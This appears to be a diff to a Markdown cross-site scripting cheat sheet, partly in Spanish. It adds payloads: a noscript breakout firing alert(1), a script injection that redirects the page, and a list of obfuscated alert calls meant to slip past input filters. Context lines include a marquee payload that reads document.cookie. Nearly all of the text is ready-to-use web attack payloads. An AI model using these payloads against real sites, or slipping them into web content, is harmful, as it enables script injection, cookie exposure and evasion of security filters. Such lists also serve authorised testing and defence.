@@ -68,6 +68,15 @@
 
 ```
 
+### noscript
+
+`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
+
+
+### redirección 
+
+`"><script>document.location="http://google.com";</script>`
+
 
 ### JavaScript
 
@@ -83,5 +92,15 @@
 `<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>`
 
 
-
-
+### Filter Bypass Alert Obfuscation
+ ```
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top[“al”+”ert”](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top[‘al\145rt’](1)
+top[‘al\x65rt’](1)
+top[8680439..toString(30)](1)
+```
